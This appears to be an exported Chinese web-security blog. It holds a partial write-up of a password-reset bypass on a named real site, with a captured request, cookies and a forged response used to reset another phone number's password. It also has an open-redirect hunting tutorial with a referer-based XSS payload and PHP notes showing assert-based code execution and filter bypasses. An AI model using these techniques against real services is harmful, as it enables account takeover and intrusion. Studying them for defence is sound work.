    <content><![CDATA[<p>1、打开Url：<a href="https://i.houxue.com/accounts/getpwd/step1/?type=1，然后写上正确的手机和验证码" target="_blank" rel="noopener">https://i.houxue.com/accounts/getpwd/step1/?type=1，然后写上正确的手机和验证码</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/zodsdsoqrjppj5nr02ix8b17/image_1cpsanijp57r1fu0c5j4tbgmv9.png" alt="image_1cpsanijp57r1fu0c5j4tbgmv9.png-61.1kB"></p>
<p>2、然后下一步来到重置页面（经测试这个是经过<code>key</code>来重置用户密码的），然后再去打开一个找回密码页面</p>
<p><img src="http://static.zybuluo.com/1kbfree/2m21sl9kgf08jes3sz7f05nh/image_1cpsaq20v1a07h8e1t5bf76164hm.png" alt="image_1cpsaq20v1a07h8e1t5bf76164hm.png-120.4kB"></p>
<p>3、重新打开一个找回密码<code>Url</code>，然后输入<code>18888888881</code>后，获取验证码，然后乱写验证码然后把返回包的<code>false</code>修改为<code>true</code>，可以获得到一个<code>key</code>，如下图</p>
<p><img src="http://static.zybuluo.com/1kbfree/86ypk6l6uiaxw8dhqyzzz1st/image_1cpsb2lt4t3k6h1o6dlv19fa13.png" alt="image_1cpsb2lt4t3k6h1o6dlv19fa13.png-166.9kB"></p>
<p>然后还会获取一个数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;accounts&#x2F;getpwd&#x2F;step1submit&#x2F;?type&#x3D;1 HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: i.houxue.com</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span></pre></td></tr><tr><td class="code"><pre><span class="line">x-requested-with: XMLHttpRequest</span></pre></td></tr><tr><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;i.houxue.com&#x2F;accounts&#x2F;getpwd&#x2F;step1&#x2F;?type&#x3D;1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 63</span></pre></td></tr><tr><td class="code"><pre><span class="line">Cookie: houxue_aid&#x3D;d45002e7585ae083e0c17f3bb0dc073bf3b6a51d%7E236; session&#x3D;b70qlb84bn8ktfdhrojllvm5d1; historysearch&#x3D;780b23892275abf28f2c78f2fc99fa78b9c453a6%7Ea%3A2%3A%7Bi%3A0%3Ba%3A5%3A%7Bs%3A5%3A%22refer%22%3Bs%3A54%3A%22https%253A%252F%252Fsearch.houxue.com%252Fkecheng.html%253Fkw%253D%22%3Bs%3A4%3A%22rows%22%3Bs%3A1%3A%220%22%3Bs%3A2%3A%22kw%22%3Bs%3A0%3A%22%22%3Bs%3A3%3A%22url%22%3Bs%3A96%3A%22https%253A%252F%252Fsearch.houxue.com%252Findex.php%253Fcon%253Dkecheng%2526act%253Dsearchlog%2526kw%253D%2526rows%253D0%22%3Bs%3A4%3A%22type%22%3Bi%3A2%3B%7Di%3A1%3Ba%3A5%3A%7Bs%3A5%3A%22refer%22%3Bs%3A60%3A%22https%253A%252F%252Fsearch.houxue.com%252Fkecheng.html%253Fkw%253D123321%22%3Bs%3A4%3A%22rows%22%3Bs%3A1%3A%220%22%3Bs%3A2%3A%22kw%22%3Bs%3A6%3A%22123321%22%3Bs%3A3%3A%22url%22%3Bs%3A102%3A%22https%253A%252F%252Fsearch.houxue.com%252Findex.php%253Fcon%253Dkecheng%2526act%253Dsearchlog%2526kw%253D123321%2526rows%253D0%22%3Bs%3A4%3A%22type%22%3Bi%3A2%3B%7D%7D; 50de9d33ecd4872aa4aac3cc9f39e7c1&#x3D;2b4e8357c8afa313070b8f4cfc47dc40cd338b31%7E50de9d33ecd4872aa4aac3cc9f39e7c1; UM_distinctid&#x3D;1667830aecc24b-0e97b8a03814278-1262694a-19a100-1667830aecd18d; CNZZDATA1254568359&#x3D;604639163-1539614372-https%253A%252F%252Fsearch.houxue.com%252F%7C1539619846; 0&#x3D;1e487d840b5f8d69c757915ae3312047b89c1c82%7E0; BEC&#x3D;07c8053d39ddefe935f23f5319686256|1539615389|1539615269; device&#x3D;e710985d5d064a00c4635c6f18ace055a350beba%7Epc; coodomain&#x3D;5bc0163fa0f56d2bd770c1e59427f73c6c436804%7Egz; trueareainfo&#x3D;762b685507ce792fb38766feff006fc6ff0d9023%7E%7B%22Id%22%3A%22236%22%2C%22AreaName%22%3A%22%5Cu5e7f%5Cu5dde%22%2C%22PId%22%3A%2223%22%2C%22Domain%22%3A%22gz%22%2C%22PinYin%22%3A%22guangzhou%22%2C%22Level%22%3A%221%22%2C%22Workphone%22%3A%22400-656-3685%22%2C%22OnlineCallCode%22%3A%22%3Cscript++type%3D%5C%22text%5C%2Fjavascript%5C%22+src%3D%5C%22http%3A%5C%2F%5C%2Fim.houxue.com%5C%2Fchat%5C%2Fotherstat%5C%2Fstat%3Fsiteid%3D11995%5C%22%3E%3C%5C%2Fscript%3E%22%2C%22SiteCounterCode%22%3A%22%22%7D; loginid&#x3D;1eefa46171fb14d2c6ef16ee7f8242a5f5f7ecb6%7E1180991</span></pre></td></tr><tr><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ways&#x3D;phone&amp;phone&#x3D;18888888881&amp;short_msg&#x3D;000000&amp;email&#x3D;&amp;short_msg&#x3D;</span></pre></td></tr></table></figure>

<p>然后查看他返回包</p>
<p><img src="http://static.zybuluo.com/1kbfree/6ihjzmu2crsx6p0e7yrfdmvp/image_1cpsb4b3q17l38cq1dugaoc1udp1g.png" alt="image_1cpsb4b3q17l38cq1dugaoc1udp1g.png-91.3kB"></p>
<p>获取到<code>key</code>为<code>717c1d9e980e87d25ba2bdac618a8776</code>，然后回到之前重置密码处Url,把获取的<code>key</code>替换进去</p>
<p><img src="http://static.zybuluo.com/1kbfree/9y9kg17i63n9ilkliblme38l/image_1cpsb8dtsmcb1i51a29hon11e1t.png" alt="image_1cpsb8dtsmcb1i51a29hon11e1t.png-274.6kB"></p>
<p>然后<code>18888888881</code>的密码就被修改为<code>123456oo</code>了</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>对web安全的一些经验分享[url跳转篇]</title>
    <url>/2019/05/23/%E5%AF%B9web%E5%AE%89%E5%85%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB-url%E8%B7%B3%E8%BD%AC%E7%AF%87/</url>
    <content><![CDATA[<p>今年是挖洞的一年了，也对<code>web</code>安全产生了感情，之前盲目于一直挖洞每天技术都没什么增长，多的仅是那么一点点的经验，而且通过这次的护网行动，也看出了自己的很多不足，说白了就是很菜然后自己还没看清自己，所以接下来的日子里，自己都会尽量去接触一些自己的知识盲区来扩大自己的知识面。</p>
<blockquote>
<p>都是自己的一些心得，并非炒作于哪儿</p>
</blockquote>
<h1 id="针对url跳转漏洞"><a href="#针对url跳转漏洞" class="headerlink" title="针对url跳转漏洞"></a>针对<code>url</code>跳转漏洞</h1><p>1、在登录\注册\找回密码\退出处<br>2、站内跳（如在当前页面下写一个链接，然后我们点击的话就会以这种形式<code>&lt;a href=&#39;http://www.站内.com/?tourl=写下的链接&#39;&gt;写下的链接&lt;/a&gt;</code>）还有<code>404</code>页面跳，成功执行某操作的跳<br>3、退回（比如有些页面有返回的功能，就是跳转到上一个页面，而且是根据<code>referer</code>值来跳的）</p>
<h2 id="登录-注册-找回密码-退出"><a href="#登录-注册-找回密码-退出" class="headerlink" title="登录\注册\找回密码\退出"></a>登录\注册\找回密码\退出</h2><p>这些点我们可以考虑利用<code>fuzz</code>来对其进行探查出跳转漏洞</p>
<p>我的<code>fuzz</code>中理解为分 2 种</p>
<ol>
<li>盲<code>fuzz</code>来找跳转参数</li>
<li>针对性找跳转参数</li>
</ol>
<h3 id="一个栗子（登陆处fuzz）"><a href="#一个栗子（登陆处fuzz）" class="headerlink" title="一个栗子（登陆处fuzz）"></a>一个栗子（登陆处<code>fuzz</code>）</h3><p>这是一个登陆系统</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.xxx.xxx&#x2F;account&#x2F;signin</span></pre></td></tr></table></figure>

<p>那么我们可以选择第一种办法来对其进行<code>fuzz</code>来爆破出跳转参数，比如<code>url</code>、<code>go</code>、<code>re</code>等，但是这种不一定有效而且高效，所以我一般会先尝试第二种办法 <strong>针对性</strong> 找跳转参数</p>
<p>1.审查源代码</p>
<p>因为很多跳转参数都是在前端构造的</p>
<p>2.查询<code>hidden</code>、<code>url</code>之类的参数（因为很多系统都会把要跳转的参数放在<code>input</code>上，并且设置其为隐藏，这样子可以不影响界面美观，然后把<code>value</code>的值作为跳转参数，登陆后读取其值来确认要跳转的地儿~）</p>
<p><img src="http://static.zybuluo.com/1kbfree/fit4wo252iluyw5eda6d9epk/image_1dbb97vek84rs4defr1s9u1so49.png" alt="image_1dbb97vek84rs4defr1s9u1so49.png-33.3kB"></p>
<p>那么我们就提取出这个<code>returnUrl</code>构造在<code>url</code>里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.xxx.abc&#x2F;account&#x2F;signin?returnUrl&#x3D;http:&#x2F;&#x2F;www.xxx.abc&#x2F;123321</span></pre></td></tr></table></figure>

<p>这里第一步测试的时候是先填他的主域名（因为如果你一上来就填写你想跳转的<code>url</code>他可能有过滤的可能直接将其替换为空或者是主站域名），后面的<code>123321</code>是个人的日常习惯，用户定位源代码处的，这个小小小技巧也可以用在测试<code>xss</code>漏洞上，快速定位源代码的回显处</p>
<p>3.查看效果</p>
<p><img src="http://static.zybuluo.com/1kbfree/x3fxpxvboykl8uo5agc5l2ah/image_1dbb9i97d6g7ebn125opad1elj1g.png" alt="image_1dbb9i97d6g7ebn125opad1elj1g.png-383.2kB"></p>
<p>4.尝试直接输入想跳转的<code>url</code>，看他是否有过滤</p>
<p><img src="http://static.zybuluo.com/1kbfree/tqljmirxg0mdohrkavw0xk1f/image_1dbb9higs1kbteiomrh11o8158613.png" alt="image_1dbb9higs1kbteiomrh11o8158613.png-54kB"></p>
<p>然后登陆后就成功跳转了~</p>
<h3 id="再举一个栗子"><a href="#再举一个栗子" class="headerlink" title="再举一个栗子"></a>再举一个栗子</h3><p>一个管理员才可以登录的系统，可是俺没有账号密码如何判断他是否存在<code>url</code>跳转呢o v o~，（我爆破不出来，我捡你一个洞总可以吧╭(╯^╰)╮）</p>
<p>如下是一个管理员的登录系统（只要不能注册的界面，俺都叫他管理员的登录系统）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.admin.xxx&#x2F;supplier_web&#x2F;login?returnUrl&#x3D;http%3A%2F%2F127.0.0.1</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/ft43hcooqtctfqkleeto2oqk/image_1dbba30kobs81ko31k6asq6avj2d.png" alt="image_1dbba30kobs81ko31k6asq6avj2d.png-198.7kB"></p>
<p>可以看到这里不能注册，我们也不知道密码，那么怎么测试他是否可以跳转？</p>
<p>其实很简单</p>
<ol>
<li>登录的时候抓包</li>
<li>修改状态码（把<code>flase</code>改成<code>true</code>这些）</li>
<li>然后就会跳转，因为这里的逻辑是，服务器通过判断状态码来给你构造一个登录流程，而这个登录流程支持跳转，那么就可以成功的测试出来啦~</li>
</ol>
<p><img src="http://static.zybuluo.com/1kbfree/hf4qi13b8p3t2wid4jintn7e/image_1dbbaa6pj16of9974ep2rnv0b2q.png" alt="image_1dbbaa6pj16of9974ep2rnv0b2q.png-53.9kB"></p>
<blockquote>
<p>本来服务器返回的<code>statusCode</code>是<code>500</code>的，我将其修改为<code>200</code></p>
</blockquote>
<p>接着就有这么一个请求过来</p>
<p><img src="http://static.zybuluo.com/1kbfree/cyq7ca6c4xcybsi1au13myuw/image_1dbbacav275upnn1k09f4v1fse37.png" alt="image_1dbbacav275upnn1k09f4v1fse37.png-74.6kB"></p>
<p>成功跳转~</p>
<p>然后还有站内跳，成功提示后跳都是一样的，对参数进行<code>fuzz</code>，然后绕过，如果绕不过就砸电脑一气呵成即可；</p>
<p>还有一个是<code>adrian</code>师傅和我分享过的，把登录处的<code>login</code>改成<code>logout</code>，然后对跳转参数进行过滤的功能就不存在了，因为开发者都不会想到在<code>logout</code>参数那里做参数过滤，然后就导致了可以直接导致<code>url</code>跳转漏洞的产生</p>
<h2 id="退回功能的跳转导致了反射xss"><a href="#退回功能的跳转导致了反射xss" class="headerlink" title="退回功能的跳转导致了反射xss"></a>退回功能的跳转导致了反射<code>xss</code></h2><p>之前遇到过，但是忘记记录了，也是比较好玩的我大概讲解一下</p>
<p>1、打开<code>http://www.111.com/back</code>他会跳转到<code>referer</code>的值（而且这里可以解析<code>html</code>，并且<code>referer</code>值在<code>script</code>脚本里<code>&lt;script&gt;url = &#39;referer值&#39;;window.location.href=url&lt;/script&gt;</code>）<br>2、我在自己的网站创建了一个文件(<code>only_free.php</code>)，然后其功能是跳转到<code>www.111.com/back</code>，那么我可以这样子请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.only_free.com&#x2F;only_free.php?name&#x3D;&#39;;alert(1);b&#x3D;&#39;1</span></pre></td></tr></table></figure>

<p>最后<code>http://www.111.com/back</code>里的<code>js</code>代码就变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; &#39;&#39;;alert(1);b&#x3D;&#39;1&#39;;window.location.href&#x3D;url</span></pre></td></tr></table></figure>

<p>然后就成功弹窗了。</p>
<blockquote>
<p>作者微信：refuel_iamfree</p>
</blockquote>
<p>有兴趣的朋友可以加我一起交流</p>
<blockquote>
<p>更多Url跳转文章：<a href="https://www.zybuluo.com/1kbfree/note/1394679" target="_blank" rel="noopener">https://www.zybuluo.com/1kbfree/note/1394679</a></p>
</blockquote>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP函数统计</title>
    <url>/2019/02/13/PHP%E5%87%BD%E6%95%B0%E7%BB%9F%E8%AE%A1/</url>
    <content><![CDATA[<blockquote>
<p>当初自己也不知道写这个干什么，干劲十足吧，既然写了就发出来继续更新吧。</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/pswqhytgfahplm0g9nys439y/image_1cee71otlos41qp4gq6j651r979.png" alt="image_1cee71otlos41qp4gq6j651r979.png-218.7kB"></p>
<p>不显示错误信息:<code>error_reporting(0)</code></p>
<p>文件包含函数:<code>include()、include_once()、require()、require_once()</code></p>
<p>开启session:<code>session_start()</code></p>
<p>是否开启了gpc功能:<code>if( !get_magic_quotes_gpc() ){}</code></p>
<p>过滤函数:<code>addslashes()</code>入敏感的内容会被转义(\)</p>
<hr>
<p><strong>strtoupper()用法：</strong></p>
<blockquote>
<p>将内容转成大写</p>
</blockquote>
<hr>
<p><strong>等号用处分类：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、&#x3D;：赋值，在逻辑运算时也有效；</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">2、&#x3D;&#x3D;：等于运算，但是不比较值的类型；</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">3、&#x3D;&#x3D;&#x3D;：完全等于运算，不仅比较值，而且还比较值的类型，只有两者一致才为真。</span></pre></td></tr></table></figure>

<hr>
<p><strong>strpos()用法：</strong></p>
<p><img src="http://static.zybuluo.com/1kbfree/v7u0u2vt3mstermy54yh51h8/image_1cml2asu81dbc113tjcv1u641lvv9.png" alt="image_1cml2asu81dbc113tjcv1u641lvv9.png-23.2kB"></p>
<hr>
<p><strong>call_user_func()用法：</strong></p>
<p><img src="http://static.zybuluo.com/1kbfree/kboyep98ziafatwl06orc0ho/image_1cmmfs7ek14eupqrspq1ge9mghp.png" alt="image_1cmmfs7ek14eupqrspq1ge9mghp.png-9.4kB"></p>
<p>如果我们传递<code>?a=assert&amp;b=phpinfo()</code>就会执行<code>phpinfo</code>函数，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/o4n7cdfbnbrhxi992atpl4ik/image_1cmmft0fpri5gt1cs4jaj1uel16.png" alt="image_1cmmft0fpri5gt1cs4jaj1uel16.png-108.3kB"></p>
<hr>
<p><strong>readfile()用法：</strong></p>
<blockquote>
<p>定义和用法</p>
</blockquote>
<p><code>readfile()</code> 函数输出一个文件。<br>该函数读入一个文件并写入到输出缓冲。<br>若成功，则返回从文件中读入的内容与字节数。若失败，则返回 false。您可以通过 <code>@readfile()</code> 形式调用该函数，来隐藏错误信息。</p>
<p><code>readfile( filename,include_path,context )</code></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">filename</td>
<td align="center">必需。规定要读取的文件。</td>
</tr>
<tr>
<td align="center">include_path</td>
<td align="center">可选。如果也想在include_path中搜索文件，可以使用该参数并将其设为 true。</td>
</tr>
<tr>
<td align="center">context</td>
<td align="center">可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> readfile( <span class="string">'cai_team.txt'</span> );</span></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/1kbfree/v6c48k8uhhan8wid021wdjdv/image_1cf5k429h93b1t2dls83t6db919.png" alt="image_1cf5k429h93b1t2dls83t6db919.png-42.2kB"></p>
<hr>
<p><strong>define用法:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">define(<span class="string">"GREETING"</span>,<span class="string">"Hello world!"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( defined(<span class="string">"GREETING"</span>) ); <span class="comment">//如果存在返回True</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">var_dump( defined(<span class="string">"only_free"</span>) );</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span></span></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="http://static.zybuluo.com/1kbfree/h6f8bb30aqob5krl7kutm4l5/image_1cjgnhepi1qip65erps107v134p9.png" alt="image_1cjgnhepi1qip65erps107v134p9.png-44.4kB"></p>
<hr>
<p><strong>chdir用法:</strong></p>
<p><img src="http://static.zybuluo.com/1kbfree/z9hjzdocsf3qe8tbas1qc0hf/image_1cdp74hqt1rgd9ln1rgv736man9.png" alt="image_1cdp74hqt1rgd9ln1rgv736man9.png-28.3kB"></p>
<hr>
<p><strong>mkdir用法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">    mkdir(&#39;1.iamfree&#39;) &#x2F;&#x2F;会在当前目录下创建一个1.iamfree文件夹</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<hr>
<p><strong>const用法：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">    const name&#x3D;&#39;iamfree&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo name;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;*</span></pre></td></tr><tr><td class="code"><pre><span class="line">输出:iamfree</span></pre></td></tr><tr><td class="code"><pre><span class="line">*&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<hr>
<p><strong>htmlspecialchars()函数：</strong><br><img src="http://static.zybuluo.com/1kbfree/q8yrwithqaykeziaxj3w50aq/image_1cavlibuatcrb7u1qbv6ni1p9.png" alt="image_1cavlibuatcrb7u1qbv6ni1p9.png-17.3kB"></p>
<h3 id="执行转换"><a href="#执行转换" class="headerlink" title="执行转换:"></a>执行转换:</h3><table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">替换后</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&amp; (&amp; 符号)</td>
<td align="left"><code>&amp;amp;</code></td>
</tr>
<tr>
<td align="left">“ (双引号)</td>
<td align="left"><code>&amp;quot;</code>，除非设置了 ENT_NOQUOTES</td>
</tr>
<tr>
<td align="left">‘ (单引号)</td>
<td align="left">设置了 ENT_QUOTES 后， &#039; (如果是 ENT_HTML401) ，或者 &apos; (如果是 ENT_XML1、ENT_XHTML 或 ENT_HTML5)。</td>
</tr>
<tr>
<td align="left">&lt; (小于)</td>
<td align="left"><code>&amp;lt</code></td>
</tr>
<tr>
<td align="left">&gt; (大于)</td>
<td align="left"><code>&amp;gt</code></td>
</tr>
</tbody></table>
<hr>
<p><strong>extract()函数:</strong><br><img src="http://static.zybuluo.com/1kbfree/bbsz4gdm60bwu3xpa3bb09k2/image_1cb2cblp6lpb19ku1ouu4d81h701t.png" alt="image_1cb2cblp6lpb19ku1ouu4d81h701t.png-32.2kB"></p>
<hr>
<p><strong>parse_str()：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    parse_str(&#39;name&#x3D;iamfree&#39;); &#x2F;&#x2F;把name变成变量名，iamfree变成变量值</span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo $name;&#x2F;&#x2F;输出iamfree</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<hr>
<p><strong>import_request_variables():</strong></p>
<p><em>此函数把GET、POST、COOKIE的参数注册为变量，一般不建议开启</em></p>
<blockquote>
<p>注意,只在 <code>PHP4.1</code>到<code>PHP5.4</code>之间可用</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    $name &#x3D; &#39;whoami&#39;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    import_request_variables(&#39;GP&#39;); &#x2F;&#x2F;G表示GET、P表示POST如果有C表示COOKIE；这里的GP表示注册GET和POST请求的参数为变量</span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo $name;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<p><strong>效果：</strong><br><img src="http://static.zybuluo.com/1kbfree/n09o5bhlvrv1my1f2zqxgf4q/image_1cckvkb6b186c6g11p8ojf4lbd9.png" alt="image_1cckvkb6b186c6g11p8ojf4lbd9.png-54.1kB"></p>
<hr>
<p><strong>array_key_exists()：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_key_exists ( $key , $array )</span></pre></td></tr></table></figure>
<blockquote>
<p>数组里有键 key 时，array_key_exists() 返回 TRUE。 key 可以是任何能作为数组索引的值。</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/wkcc7p351cowwqz1k9hjbwy3/image_1cba1lh3okkkg0n1qkp1uuc104v9.png" alt="image_1cba1lh3okkkg0n1qkp1uuc104v9.png-16.1kB"></p>
<hr>
<p><strong>str_ireplace过滤sql语句：</strong><br><img src="http://static.zybuluo.com/1kbfree/hmfq9fei2t8khzcusyszh8i3/str_ireplace.png" alt="str_ireplace.png-816.7kB"><br><strong>此函数用法：</strong><br><img src="http://static.zybuluo.com/1kbfree/7yuotvm35lw7w6zzdr1q414y/str_ireplace%E7%94%A8%E6%B3%95.png" alt="str_ireplace用法.png-6.4kB"><br><em>将 whoami? 中的 whoami 被 iamfree 替换，也就是说把whoami?里的whoami替换成iamfree所以结果就是iamfree?</em></p>
<p><strong>这里其实是可以绕过的，比如：</strong><br><img src="http://static.zybuluo.com/1kbfree/1vaj8guxs3swd43zh3uvkqbb/image_1caugtd8fj54ke9tf112cr1qbl4h.png" alt="image_1caugtd8fj54ke9tf112cr1qbl4h.png-150.2kB"></p>
<hr>
<p>运算符:<br>名称  |  关系 |    示例     |        结果<br>:-:|:-:|:-:<br>and  |  与 |      <code>$x and $y</code>    |如果 <code>$x</code> 和 <code>$y</code> 都为 true，则返回 true。    |<br>or  |     或     | <code>$x or $y</code>   |    如果 <code>$x</code> 和 <code>$y</code> 至少有一个为 true，则返回 true。<br>xor |    异或  |  <code>$x</code> xor <code>$y</code>  |   如果 <code>$x</code> 和 <code>$y</code> 有且仅有一个为 true，则返回 true。<br>&amp;&amp;  |  与    |    <code>$x</code> &amp;&amp; <code>$y</code>   | 如果 <code>$x</code> 和 <code>$y</code> 都为 true，则返回 true。<br>||    |    或  |      <code>$x</code> ||<code>$y</code> |       如果 <code>$x</code> 和 <code>$y</code> 至少有一个为 true，则返回 true。<br>! |    非    |     <code>!$x</code>|              如果 $x 不为 true，则返回 true。</p>
<hr>
<p><strong>变量覆盖:</strong><br><img src="http://static.zybuluo.com/1kbfree/p5uq0jbmj08gy7607w66rm51/image_1cbrhvola1igmjhm15mc1rsqed816.png" alt="image_1cbrhvola1igmjhm15mc1rsqed816.png-33.4kB"><br><img src="http://static.zybuluo.com/1kbfree/wfifd51c43j7d5zdxsg08bd1/image_1cbri0lsa1tuc1erh1d5q1drsdre1j.png" alt="image_1cbri0lsa1tuc1erh1d5q1drsdre1j.png-70.7kB"></p>
<p><strong>难一点的：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span></pre></td></tr><tr><td class="code"><pre><span class="line">    foreach (array( &#39;_GET&#39;,&#39;_POST&#39; ) as $key &#x3D;&gt; $value) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        foreach ($$value as $_key &#x3D;&gt; $_value)&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            echo $_key.&#39;:&#39;.$_value;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            echo &quot;&lt;br &gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<p><strong>执行后的结果：</strong><br><img src="http://static.zybuluo.com/1kbfree/n7f97a459waufv27gbwrmsv0/image_1ccl9ivq22vk1pdat631f7oq8s1g.png" alt="image_1ccl9ivq22vk1pdat631f7oq8s1g.png-32.5kB"></p>
<hr>
<p><strong>define()用法:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span></pre></td></tr><tr><td class="code"><pre><span class="line">    define(&#39;t&#39;,time()); &#x2F;&#x2F;把time()的返回值定义为常量(t)    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo t;</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://static.zybuluo.com/1kbfree/3l030blxz655udwgyqy75sei/image_1ccl95vnr10rv1el118e91bdl155m13.png" alt="image_1ccl95vnr10rv1el118e91bdl155m13.png-73.9kB"></h2><p><strong>三元表达式:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    $name &#x3D; !empty($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : &#39;此人无名&#39;; &#x2F;&#x2F;表示如果$_GET[&#39;name&#39;]不为空的话就返回$_GET[&#39;name&#39;]如果为空就返回 此人无名。</span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo $name;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>



<p><strong>还可以有一种判断方法：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo 1;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    isset($_GET[&#39;name&#39;]) &amp;&amp; exit(&#39;exit&#39;); &#x2F;&#x2F;如果isset($_GET[&#39;name&#39;])为真也就是name这个参数存在的时候，会执行exit(&#39;exit&#39;)，相反，不存在的时候不会执行exit(&#39;exit&#39;)   </span></pre></td></tr><tr><td class="code"><pre><span class="line">    echo 2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
